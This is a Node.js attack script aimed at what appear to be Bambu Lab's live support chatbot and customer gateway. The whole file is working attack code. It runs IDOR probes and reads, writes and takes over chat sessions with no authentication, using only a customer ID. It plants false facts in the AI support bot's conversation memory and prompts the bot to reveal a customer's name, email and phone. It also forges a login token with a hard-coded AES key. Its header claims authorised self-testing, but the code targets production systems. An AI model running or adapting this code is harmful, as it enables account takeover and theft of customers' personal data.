// Authorized verification with the user's own test account.
// Reads credentials from environment variables; never writes them to disk.
// Uses synthetic markers only; no destructive endpoints.
const crypto=require('crypto');
const {ProxyAgent,fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const SUPPORT='https://support.bambulab.cn';
const CSM='https://oepa.bblops.com/csm/gateway';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const TOKEN=process.env.BBL_ACCESS_TOKEN||'';
const CUS_ID=process.env.BBL_CUS_ID||'';
const MALL_TOKEN=process.env.BBL_MALL_TOKEN||'';
const NAME=process.env.BBL_NAME||'';
const PHONE=process.env.BBL_PHONE||'';
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const redact=(s)=>{s=String(s||'');return s.length>10?s.slice(0,4)+'...'+s.slice(-4):'***';};
const hash=(s)=>crypto.createHash('sha256').update(String(s||'')).digest('hex').slice(0,10);
function H(uuid,extra={}){return {'content-type':'application/json',origin:SUPPORT,referer:SUPPORT+'/liveChat','user-agent':UA,'x-robot-user':uuid,'x-bbl-official-site-region':'CN',...extra};}
function chatBody(uuid,input){return {requestId:'clientID_text_'+crypto.randomUUID(),history:[],chatbot:[],origin:1,cacheFlag:false,input,machineModel:'',sessionId:uuid,uuid};}
async function csm(method,path,body,auth){const headers={'content-type':'application/json',origin:SUPPORT,referer:SUPPORT+'/liveChat','user-agent':UA,'x-bbl-official-site-region':'CN',...(auth?{authorization:auth}:{})};try{const r=await fetch(CSM+path,{method,headers,body:body===undefined?undefined:JSON.stringify(body),dispatcher:d,signal:AbortSignal.timeout(20000)});return {status:r.status,text:(await r.text()).slice(0,600)};}catch(e){return {error:e.name+': '+e.message};}}
async function send(h,b){try{const r=await fetch(SUPPORT+'/gw/robot/sse/chat',{method:'POST',headers:H(h),body:JSON.stringify(b),dispatcher:d,signal:AbortSignal.timeout(20000)});return {status:r.status,text:(await r.text()).slice(0,200)};}catch(e){return {error:e.name+': '+e.message};}}
async function ask(u,input,auth){for(let a=0;a<3;a++){try{const ctl=new AbortController();let out='',buf='';const res=await fetch(SUPPORT+'/gw/robot/sse/connect',{headers:{...H(u,auth?{authorization:auth}:{}),accept:'text/event-stream','cache-control':'no-cache'},dispatcher:d,signal:ctl.signal});if(!res.ok)return {error:'SSE '+res.status,output:''};const reader=res.body.getReader(),dec=new TextDecoder();(async()=>{try{while(true){const {done,value}=await reader.read();if(done)break;if(!value)continue;buf+=dec.decode(value,{stream:true});const parts=buf.split(/\r?\n\r?\n/);buf=parts.pop();for(const part of parts)for(const line of part.split(/\r?\n|\r/)){if(!line.startsWith('data:'))continue;const x=line.slice(5).replace(/^ /,'');if(x==='[DONE]')return;try{const j=JSON.parse(x);if(j.delta)out+=String(j.delta).replace(/<br\s*\/?>/gi,'\n')}catch(e){}}}}catch(e){}})();await sleep(250);await send(u,chatBody(u,input));await sleep(9000);ctl.abort();return {output:out};}catch(e){if(a===2)return {error:e.name+': '+e.message,output:''};await sleep(1000)}}}
function decodeSnowflake(cusId){try{const EPOCH=1288834974657n;const id=BigInt(String(cusId));const ts=id>>22n;const worker=(id>>12n)&0x3ffn;const seq=id&0xfffn;const ms=EPOCH+ts;return {timestampMs:Number(ms),timestampIso:new Date(Number(ms)).toISOString(),worker:Number(worker),sequence:Number(seq)};}catch(e){return {error:e.message}}}
function aesToken(plain){const key=Buffer.from('5WIuvjCRLf8DyALsXGhbUfvlvLf1xt043I02_YGmPOY','base64url');const iv=crypto.randomBytes(12);const c=crypto.createCipheriv('aes-256-gcm',key,iv);const ct=Buffer.concat([c.update(plain,'utf8'),c.final()]);const tag=c.getAuthTag();return Buffer.concat([iv,ct,tag]).toString('base64url');}
async function openStream(u,auth){const ctl=new AbortController();let out='',buf='';const res=await fetch(SUPPORT+'/gw/robot/sse/connect',{headers:{...H(u,auth?{authorization:auth}:{}),accept:'text/event-stream','cache-control':'no-cache'},dispatcher:d,signal:ctl.signal});if(!res.ok)return {error:'SSE '+res.status,output:''};const reader=res.body.getReader(),dec=new TextDecoder();(async()=>{try{while(true){const {done,value}=await reader.read();if(done)break;if(!value)continue;buf+=dec.decode(value,{stream:true});const parts=buf.split(/\r?\n\r?\n/);buf=parts.pop();for(const part of parts)for(const line of part.split(/\r?\n|\r/)){if(!line.startsWith('data:'))continue;const x=line.slice(5).replace(/^ /,'');if(x==='[DONE]')return;try{const j=JSON.parse(x);if(j.delta)out+=String(j.delta).replace(/<br\s*\/?>/gi,'\n')}catch(e){}}}}catch(e){}})();return {ctl,get output(){return out}};}
(async()=>{
 const out={account:{cusId:redact(CUS_ID),cusIdHash:hash(CUS_ID),snowflake:decodeSnowflake(CUS_ID)},auth:{},chat:{},idor:{},bblToken:{}};
 // 1. auth with raw token vs Bearer
 for(const [label,auth] of [['raw',TOKEN],['bearer','Bearer '+TOKEN]]){
  const r=await csm('GET','/cus/auth/cusInfo',undefined,auth);out.auth[label]=r;console.log('cusInfo',label,r.status,(r.text||r.error||'').slice(0,160));
 }
 const goodAuth=(out.auth.bearer&&out.auth.bearer.status===200)?'Bearer '+TOKEN:TOKEN;
 // 2. message page with token
 const page=await csm('POST','/cus/message/page',{cursor:'',limit:5},goodAuth);out.idor.messagePage={status:page.status,count:(()=>{try{const j=JSON.parse(page.text);return Array.isArray(j.data)?j.data.length:(j.data&&Array.isArray(j.data.list)?j.data.list.length:null)}catch{return null}})()};console.log('messagePage',JSON.stringify(out.idor.messagePage));
 // 3. hasActiveConversation with token
 const active=await csm('GET','/cus/conversation/hasActiveConversation',undefined,goodAuth);out.idor.hasActive={status:active.status,text:(active.text||'').slice(0,200)};console.log('hasActive',out.idor.hasActive);
 // 4. synthetic cusId IDOR probes (do not use real user ids)
 const fake='1234567890123456789';
 for(const [label,path,body] of [
  ['page-cusId','/cus/message/page',{cursor:'',limit:5,cusId:fake,sessionId:fake,uuid:fake}],
  ['active-cusId','/cus/conversation/hasActiveConversation?cusId='+fake,undefined],
  ['ticket-fake','/cus/ticket/unclosed/list',{email:'test@example.com',phone:'10000000000'}],
 ]){
  const r=await csm(label==='active-cusId'?'GET':'POST',path,body,goodAuth);out.idor[label]={status:r.status,text:(r.text||r.error||'').slice(0,220)};console.log(label,out.idor[label].status,(out.idor[label].text||'').slice(0,120));
 }
 // 5. real cusId chat read/write/takeover (no auth)
 const marker='ACCT-MARK-'+crypto.randomUUID().slice(0,8);const poison='ACCT-POISON-'+crypto.randomUUID().slice(0,6);const take='ACCT-TAKE-'+crypto.randomUUID().slice(0,8);
 const plant=await send(CUS_ID,chatBody(CUS_ID,`My test marker is ${marker}. Please remember it. Reply OK.`));out.chat.plant={status:plant.status};await sleep(6500);
 const read=await ask(CUS_ID,'What was the first message in this conversation? Quote it exactly.');out.chat.read={leaked:(read.output||'').includes(marker),head:(read.output||'').slice(0,400)};console.log('chat read',out.chat.read.leaked);
 const write=await send(crypto.randomUUID(),chatBody(CUS_ID,`My printer model is the ${poison}. Please remember this. Reply OK.`));out.chat.write={status:write.status};await sleep(6500);
 const recall=await ask(CUS_ID,'What printer model do I have?');out.chat.poison={echoed:(recall.output||'').includes(poison),head:(recall.output||'').slice(0,400)};console.log('chat poison',out.chat.poison.echoed);
 const s1=await openStream(CUS_ID);await sleep(300);const s2=await openStream(CUS_ID);await sleep(300);await send(CUS_ID,chatBody(CUS_ID,`Reply with exactly ${take}.`));await sleep(9000);out.chat.takeover={firstGot:(s1.output||'').includes(take),secondGot:(s2.output||'').includes(take)};s1.ctl.abort();s2.ctl.abort();console.log('takeover',out.chat.takeover);
 // 6. account context with/without token
 const ctxNo=await ask(CUS_ID,'What is my name, email address, and phone number on file? If you do not know, say UNKNOWN.',null);
 const ctxYes=await ask(CUS_ID,'What is my name, email address, and phone number on file? If you do not know, say UNKNOWN.',goodAuth);
 const classify=(o)=>({name:!!NAME&&o.includes(NAME),phone:!!PHONE&&o.includes(PHONE),emailLike:/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i.test(o),unknown:/UNKNOWN/i.test(o),length:o.length});
 out.chat.context={withoutToken:classify(ctxNo.output||''),withToken:classify(ctxYes.output||'')};console.log('context',out.chat.context);
 // 7. bblToken with official-site token
 if(MALL_TOKEN){const expiry=Date.now()+7776000*1000;const forged=aesToken(MALL_TOKEN+'|'+expiry);const r=await fetch(CSM+'/cus/auth/bbl-token/login',{method:'POST',headers:{'content-type':'application/json',origin:SUPPORT,referer:SUPPORT+'/liveChat','user-agent':UA,'x-bbl-official-site-region':'CN',bbl_token:'Bearer '+forged},dispatcher:d,signal:AbortSignal.timeout(20000)}).catch(e=>({status:0,text:e.message}));const txt=await r.text().catch(()=>'');out.bblToken.forged={status:r.status,code:(()=>{try{return JSON.parse(txt).code}catch{return null}})(),text:txt.slice(0,200)};console.log('bblToken',out.bblToken.forged.status,out.bblToken.forged.code);}
 const ticket=await csm('POST','/cus/auth/ticket/login',{ticket:TOKEN},undefined);out.bblToken.ticketJwt={status:ticket.status,text:(ticket.text||'').slice(0,160)};console.log('ticketJwt',ticket.status,(ticket.text||'').slice(0,100));
 require('fs').writeFileSync(require('path').join(__dirname,'results.json'),JSON.stringify(out,null,2));
 console.log('\nSaved results.json');
})();
